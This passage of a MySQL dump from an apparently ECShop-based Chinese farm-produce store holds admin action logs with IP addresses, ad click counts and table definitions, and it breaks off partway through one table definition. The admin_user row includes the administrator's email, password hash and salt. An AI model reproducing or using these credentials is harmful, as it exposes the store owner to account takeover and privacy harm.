INSERT INTO `ec22703249_admin_log` VALUES ('63', '1404699282', '1', '删除商品分类: 小米2/2S配件', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('64', '1404699292', '1', '编辑商品分类: 蛋类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('65', '1404699337', '1', '编辑商品分类: 其他', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('66', '1404699352', '1', '添加商品分类: 运费', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('67', '1404699367', '1', '添加商品分类: 农场活动费用', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('68', '1404699404', '1', '编辑商品分类: 糕点产品', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('69', '1404699461', '1', '编辑商品分类: 腌制产品', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('70', '1404699607', '1', '编辑商品分类: 水产产品', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('71', '1404699673', '1', '添加商品分类: 干货', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('72', '1404699689', '1', '添加商品分类: 新鲜腌制', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('73', '1404699699', '1', '编辑商品分类: 干货类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('74', '1404699740', '1', '添加商品分类: 鱼类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('75', '1404699754', '1', '添加商品分类: 蟹类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('76', '1404699916', '1', '编辑商品分类: 会员卡办理', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('77', '1404699996', '1', '编辑商品分类: 800元体验卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('78', '1404700036', '1', '编辑商品分类: 2600元半年卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('79', '1404700057', '1', '添加商品分类: 4800元全年卡1#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('80', '1404700074', '1', '添加商品分类: 9600元全年卡2#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('81', '1404700095', '1', '删除商品分类: 9600元全年卡2#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('82', '1404700103', '1', '删除商品分类: 4800元全年卡1#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('83', '1404700127', '1', '添加商品分类: 4800元全年卡1#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('84', '1404700154', '1', '添加商品分类: 9600元全年卡2#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('85', '1404700252', '1', '编辑商品分类: 体验会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('86', '1404700268', '1', '编辑商品分类: 全年会员卡1#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('87', '1404700284', '1', '编辑商品分类: 全年会员卡2#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('88', '1404700311', '1', '编辑商品分类: 半年会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('89', '1404700555', '1', '添加商品: 体验会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('90', '1404700621', '1', '编辑商品分类: 体验会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('91', '1404700751', '1', '编辑商品: 体验会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('92', '1404700781', '1', '编辑商品: 体验会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('93', '1404701087', '1', '添加商品: 半年会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('94', '1404701248', '1', '添加商品: 全年会员卡1#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('95', '1404701311', '1', '编辑商品: 全年会员卡1#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('96', '1404701327', '1', '编辑商品: 半年会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('97', '1404701339', '1', '编辑商品: 体验会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('98', '1404701394', '1', '添加商品: 会员卡办理2#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('99', '1404701407', '1', '删除商品分类: 全年会员卡1#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('100', '1404701410', '1', '删除商品分类: 全年会员卡2#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('101', '1404701413', '1', '删除商品分类: 体验会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('102', '1404701416', '1', '删除商品分类: 半年会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('103', '1404701430', '1', '编辑商品: 会员卡办理2#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('104', '1404701439', '1', '编辑商品: 全年会员卡1#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('105', '1404701448', '1', '编辑商品: 半年会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('106', '1404701458', '1', '编辑商品: 体验会员卡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('107', '1404701506', '1', '编辑商品: 全年会员卡1#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('108', '1404701531', '1', '编辑商品: 全年会员卡2#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('109', '1404701556', '1', '编辑商品: 全年会员卡2#', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('110', '1404702357', '1', '添加广告: 1', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('111', '1404776700', '1', '编辑商品: 全年会员卡2#', '180.173.198.82');
INSERT INTO `ec22703249_admin_log` VALUES ('112', '1404776966', '1', '编辑商品: 全年会员卡2#', '180.173.198.82');
INSERT INTO `ec22703249_admin_log` VALUES ('113', '1404780380', '1', '添加订单: 2014070806226', '180.173.198.82');
INSERT INTO `ec22703249_admin_log` VALUES ('114', '1404930790', '1', '编辑文章分类: 首页', '223.92.202.197');
INSERT INTO `ec22703249_admin_log` VALUES ('115', '1405403819', '1', '编辑文章: 常见问题', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('116', '1405403880', '1', '删除文章: 配送支付智能查询', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('117', '1405403925', '1', '编辑文章: 发票制度', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('118', '1405404567', '1', '编辑文章: 在线', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('119', '1405404575', '1', '编辑文章: 发票制度', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('120', '1405404584', '1', '编辑文章: 在线支付', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('121', '1405404627', '1', '编辑文章: 冷链配送', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('122', '1405404641', '1', '删除文章: 签收须知', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('123', '1405404649', '1', '编辑文章: 配送的范围及费用', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('124', '1405404671', '1', '删除文章: 退换货政策', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('125', '1405404678', '1', '编辑文章: 服务流程', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('126', '1405405353', '1', '编辑文章: 乐享君禾慢生活', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('127', '1405405375', '1', '编辑文章: 君禾新网上线，豪送大礼！', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('128', '1405405388', '1', '编辑文章: 君禾企业用户采购通道', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('129', '1405405403', '1', '编辑文章: 新品速递', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('130', '1405405771', '1', '删除文章: 免责条款', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('131', '1405405797', '1', '添加文章: 111', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('132', '1405406411', '1', '删除文章: 111', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('133', '1405406420', '1', '删除文章: 公司简介', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('134', '1405406423', '1', '删除文章: 联系我们', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('135', '1405406426', '1', '删除文章: 咨询热点', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('136', '1405406428', '1', '删除文章: 隐私保护', '101.228.122.139');
INSERT INTO `ec22703249_admin_log` VALUES ('137', '1405448004', '1', '编辑商品: 全年会员卡2#', '116.226.37.139');
INSERT INTO `ec22703249_admin_log` VALUES ('138', '1405535671', '1', '添加订单: 2014071779455', '116.226.37.139');
INSERT INTO `ec22703249_admin_log` VALUES ('139', '1405535704', '1', '编辑订单: 2014071779455,订单总金额由 0.00 变为 699.00', '116.226.37.139');
INSERT INTO `ec22703249_admin_log` VALUES ('140', '1405885680', '1', '编辑商店设置: ', '180.173.198.176');
INSERT INTO `ec22703249_admin_log` VALUES ('141', '1405892716', '1', '添加订单: 2014072174163', '180.173.198.176');
INSERT INTO `ec22703249_admin_log` VALUES ('142', '1405892798', '1', '添加订单: 2014072103686', '180.173.198.176');
INSERT INTO `ec22703249_admin_log` VALUES ('143', '1406138060', '1', '编辑文章: 购买流程', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('144', '1406140151', '1', '删除商品类型: 手机', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('145', '1406140194', '1', '编辑商品: 君禾园蔬菜篮', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('146', '1406222525', '1', '回收商品: 体验会员卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('147', '1406222666', '1', '添加商品: 体验卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('148', '1406222703', '1', '编辑商品: 体验卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('149', '1406222850', '1', '添加商品: 乐品卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('150', '1406222920', '1', '添加商品: 乐享品', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('151', '1406223054', '1', '添加商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('152', '1406223150', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('153', '1406223338', '1', '编辑商品: 乐享品', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('154', '1406224219', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('155', '1406235462', '1', '批量回收商品: ', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('156', '1406235586', '1', '删除操作日志: ', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('157', '1406235658', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('158', '1406235797', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('159', '1406235839', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('160', '1406236089', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('161', '1406236095', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('162', '1406236099', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('163', '1406236249', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('164', '1406236342', '1', '编辑商品: 乐享品', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('165', '1406236363', '1', '编辑商品: 乐活卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('166', '1406236432', '1', '编辑商品: 乐品卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('167', '1406236462', '1', '编辑商品: 乐享品', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('168', '1406236499', '1', '编辑商品: 体验卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('169', '1406236535', '1', '编辑商品: 体验卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('170', '1406236831', '1', '删除商品: 全年会员卡2#', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('171', '1406236833', '1', '删除商品: 全年会员卡1#', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('172', '1406236839', '1', '删除商品: 半年会员卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('173', '1406236841', '1', '删除商品: 体验会员卡', '180.173.32.138');
INSERT INTO `ec22703249_admin_log` VALUES ('174', '1406246940', '1', '编辑文章: 乐享君禾慢生活', '180.173.192.245');
INSERT INTO `ec22703249_admin_log` VALUES ('175', '1406246967', '1', '编辑文章: 君禾新网上线，豪送大礼！', '180.173.192.245');
INSERT INTO `ec22703249_admin_log` VALUES ('176', '1406247046', '1', '编辑文章: 君禾新网上线，豪送大礼！', '180.173.192.245');
INSERT INTO `ec22703249_admin_log` VALUES ('177', '1406247075', '1', '编辑文章: 君禾新网上线，豪送大礼！', '180.173.192.245');
INSERT INTO `ec22703249_admin_log` VALUES ('178', '1406247409', '1', '添加订单: 2014072529503', '180.173.192.245');
INSERT INTO `ec22703249_admin_log` VALUES ('179', '1406247450', '1', '编辑订单: 2014072529503,订单总金额由 0.00 变为 40.00', '180.173.192.245');
INSERT INTO `ec22703249_admin_log` VALUES ('180', '1406247848', '1', '添加: 卡1', '180.173.192.245');
INSERT INTO `ec22703249_admin_log` VALUES ('181', '1406247892', '1', '批量上传: 批量生成会员卡', '180.173.192.245');
INSERT INTO `ec22703249_admin_log` VALUES ('182', '1407033114', '1', '添加超值礼包: 君禾套餐', '39.180.207.226');
INSERT INTO `ec22703249_admin_log` VALUES ('183', '1407033745', '1', '添加超值礼包: 套餐2', '39.180.207.226');
INSERT INTO `ec22703249_admin_log` VALUES ('184', '1407807532', '1', '添加: 1', '116.226.46.91');
INSERT INTO `ec22703249_admin_log` VALUES ('185', '1407810144', '1', '批量上传: 批量生成会员卡', '116.226.46.91');
INSERT INTO `ec22703249_admin_log` VALUES ('186', '1407884332', '1', '添加会员账号: shoptest', '101.83.189.33');
INSERT INTO `ec22703249_admin_log` VALUES ('187', '1407894443', '1', '编辑商品分类: 叶菜类', '116.226.46.91');
INSERT INTO `ec22703249_admin_log` VALUES ('188', '1407895121', '1', '编辑权限管理: admin', '116.226.46.91');
INSERT INTO `ec22703249_admin_log` VALUES ('189', '1407977750', '1', '还原数据库备份: 备份时间2014-08-13 19:36:07', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('190', '1407978464', '1', '编辑: 22201', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('191', '1407978563', '1', '添加: 888888', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('192', '1407978650', '1', '编辑: 888888', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('193', '1408086180', '1', '编辑商品: 财神米兔', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('194', '1408086196', '1', '编辑商品: 财神米兔', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('195', '1408086298', '1', '添加商品: 67876', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('196', '1408086305', '1', '编辑商品: 67876', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('197', '1408086313', '1', '编辑商品: 67876', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('198', '1408104002', '1', '编辑商品: 67876', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('199', '1408104012', '1', '编辑商品: 67876', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('200', '1408178164', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('201', '1408178302', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('202', '1408179164', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('203', '1408184156', '1', '编辑商品: 君禾园土鸡', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('204', '1408184220', '1', '编辑商品: 君禾园土鸡', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('205', '1408190864', '1', '编辑会员注册项: 1', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('206', '1408190868', '1', '编辑会员注册项: 2', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('207', '1408190872', '1', '编辑会员注册项: 4', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('208', '1408190909', '1', '编辑会员注册项: 1', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('209', '1408190953', '1', '编辑会员注册项: 1', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('210', '1408190957', '1', '编辑会员注册项: 2', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('211', '1408190977', '1', '编辑会员注册项: 4', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('212', '1408190986', '1', '编辑会员注册项: 3', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('213', '1408191005', '1', '编辑会员注册项: MSN', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('214', '1408191025', '1', '编辑会员注册项: 8', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('215', '1408191025', '1', '编辑会员注册项: 8', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('216', '1408191062', '1', '编辑会员注册项: 0', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('217', '1408191065', '1', '编辑会员注册项: 6', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('218', '1408191071', '1', '编辑会员注册项: 8', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('219', '1408191113', '1', '编辑会员注册项: 密码找回问题', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('220', '1408191120', '1', '编辑会员注册项: 姓名', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('221', '1408191123', '1', '编辑会员注册项: 1', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('222', '1408191136', '1', '编辑会员注册项: 手机', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('223', '1408191179', '1', '编辑会员注册项: 住址', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('224', '1408191187', '1', '编辑会员注册项: 2', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('225', '1408191187', '1', '编辑会员注册项: 2', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('226', '1408191208', '1', '编辑会员注册项: 邮编', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('227', '1408191212', '1', '编辑会员注册项: 5', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('228', '1408191256', '1', '编辑会员注册项: 身份证号', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('229', '1408191260', '1', '编辑会员注册项: 6', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('230', '1408191272', '1', '添加会员注册项: 家庭人数', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('231', '1408191286', '1', '添加会员注册项: 是否有老人', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('232', '1408191303', '1', '删除会员注册项: 是否有老人', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('233', '1408326171', '1', '添加会员注册项: 是否有老人', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('234', '1408326177', '1', '编辑会员注册项: 10', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('235', '1408326192', '1', '添加会员注册项: 是否有小孩', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('236', '1408327869', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('237', '1408328782', '1', '编辑: 00993', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('238', '1408328782', '1', '编辑: 00993', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('239', '1408330509', '1', '编辑: 00993', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('240', '1408330510', '1', '编辑: 00993', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('241', '1408330578', '1', '编辑: 00993', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('242', '1408330579', '1', '编辑: 00993', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('243', '1408331168', '1', '编辑: 00992', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('244', '1408331918', '1', '编辑: 00986', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('245', '1408331930', '1', '编辑: 00986', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('246', '1408331930', '1', '编辑: 00986', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('247', '1408332015', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('248', '1408332030', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('249', '1408332037', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('250', '1408332174', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('251', '1408332198', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('252', '1408332214', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('253', '1408332245', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('254', '1408332361', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('255', '1408332400', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('256', '1408332461', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('257', '1408332528', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('258', '1408332537', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('259', '1408332562', '1', '编辑会员账号: hellotiger', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('260', '1408332570', '1', '编辑会员账号: hellotigers', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('261', '1408332635', '1', '添加会员账号: tst', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('262', '1408332690', '1', '编辑会员账号: tst', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('263', '1408332697', '1', '编辑会员账号: tst', '127.0.0.1');
INSERT INTO `ec22703249_admin_log` VALUES ('264', '1408333722', '1', '添加文章: 会员卡协议', '127.0.0.1');

-- ----------------------------
-- Table structure for `ec22703249_admin_message`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_admin_message`;
CREATE TABLE `ec22703249_admin_message` (
  `message_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `sender_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `receiver_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `sent_time` int(11) unsigned NOT NULL DEFAULT '0',
  `read_time` int(11) unsigned NOT NULL DEFAULT '0',
  `readed` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `deleted` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `title` varchar(150) NOT NULL DEFAULT '',
  `message` text NOT NULL,
  PRIMARY KEY (`message_id`),
  KEY `sender_id` (`sender_id`,`receiver_id`),
  KEY `receiver_id` (`receiver_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_admin_message
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_admin_user`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_admin_user`;
CREATE TABLE `ec22703249_admin_user` (
  `user_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `user_name` varchar(60) NOT NULL DEFAULT '',
  `email` varchar(60) NOT NULL DEFAULT '',
  `password` varchar(32) NOT NULL DEFAULT '',
  `ec_salt` varchar(10) DEFAULT NULL,
  `add_time` int(11) NOT NULL DEFAULT '0',
  `last_login` int(11) NOT NULL DEFAULT '0',
  `last_ip` varchar(15) NOT NULL DEFAULT '',
  `action_list` text NOT NULL,
  `nav_list` text NOT NULL,
  `lang_type` varchar(50) NOT NULL DEFAULT '',
  `agency_id` smallint(5) unsigned NOT NULL,
  `suppliers_id` smallint(5) unsigned DEFAULT '0',
  `todolist` longtext,
  `role_id` smallint(5) DEFAULT NULL,
  PRIMARY KEY (`user_id`),
  KEY `user_name` (`user_name`),
  KEY `agency_id` (`agency_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_admin_user
-- ----------------------------
INSERT INTO `ec22703249_admin_user` VALUES ('1', 'admin', '282416127@qq.com', 'b067aaa857a573de2bd4a476b84a999c', '9713', '1403825096', '1408325097', '127.0.0.1', 'all', '商品列表|goods.php?act=list,订单列表|order.php?act=list,用户评论|comment_manage.php?act=list,会员列表|users.php?act=list,商店设置|shop_config.php?act=list_edit', '', '0', '0', '', '0');

-- ----------------------------
-- Table structure for `ec22703249_adsense`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_adsense`;
CREATE TABLE `ec22703249_adsense` (
  `from_ad` smallint(5) NOT NULL DEFAULT '0',
  `referer` varchar(255) NOT NULL DEFAULT '',
  `clicks` int(10) unsigned NOT NULL DEFAULT '0',
  KEY `from_ad` (`from_ad`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_adsense
-- ----------------------------
INSERT INTO `ec22703249_adsense` VALUES ('1', '本站', '385');
INSERT INTO `ec22703249_adsense` VALUES ('29', '本站', '3');
INSERT INTO `ec22703249_adsense` VALUES ('2', '本站', '33');
INSERT INTO `ec22703249_adsense` VALUES ('3', '本站', '47');
INSERT INTO `ec22703249_adsense` VALUES ('15', '本站', '19');
INSERT INTO `ec22703249_adsense` VALUES ('30', '本站', '178');
INSERT INTO `ec22703249_adsense` VALUES ('6', '本站', '55');
INSERT INTO `ec22703249_adsense` VALUES ('16', '本站', '7');
INSERT INTO `ec22703249_adsense` VALUES ('9', '本站', '14');
INSERT INTO `ec22703249_adsense` VALUES ('10', '本站', '15');
INSERT INTO `ec22703249_adsense` VALUES ('20', '本站', '10');
INSERT INTO `ec22703249_adsense` VALUES ('19', '本站', '5');
INSERT INTO `ec22703249_adsense` VALUES ('5', '本站', '35');
INSERT INTO `ec22703249_adsense` VALUES ('8', '本站', '11');
INSERT INTO `ec22703249_adsense` VALUES ('11', '本站', '8');
INSERT INTO `ec22703249_adsense` VALUES ('25', '本站', '15');
INSERT INTO `ec22703249_adsense` VALUES ('7', '本站', '4');
INSERT INTO `ec22703249_adsense` VALUES ('13', '本站', '4');
INSERT INTO `ec22703249_adsense` VALUES ('14', '本站', '13');
INSERT INTO `ec22703249_adsense` VALUES ('24', '本站', '5');
INSERT INTO `ec22703249_adsense` VALUES ('31', '本站', '39');
INSERT INTO `ec22703249_adsense` VALUES ('0', '本站', '67');
INSERT INTO `ec22703249_adsense` VALUES ('4', '本站', '10');
INSERT INTO `ec22703249_adsense` VALUES ('27', '本站', '13');
INSERT INTO `ec22703249_adsense` VALUES ('21', '本站', '2');
INSERT INTO `ec22703249_adsense` VALUES ('17', '本站', '3');
INSERT INTO `ec22703249_adsense` VALUES ('23', '本站', '1');
INSERT INTO `ec22703249_adsense` VALUES ('12', '本站', '2');
INSERT INTO `ec22703249_adsense` VALUES ('32', '本站', '1');

-- ----------------------------
-- Table structure for `ec22703249_ad_custom`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_ad_custom`;
CREATE TABLE `ec22703249_ad_custom` (
  `ad_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `ad_type` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `ad_name` varchar(60) DEFAULT NULL,
  `add_time` int(10) unsigned NOT NULL DEFAULT '0',
  `content` mediumtext,
  `url` varchar(255) DEFAULT NULL,
  `ad_status` tinyint(3) unsigned NOT NULL DEFAULT '0',
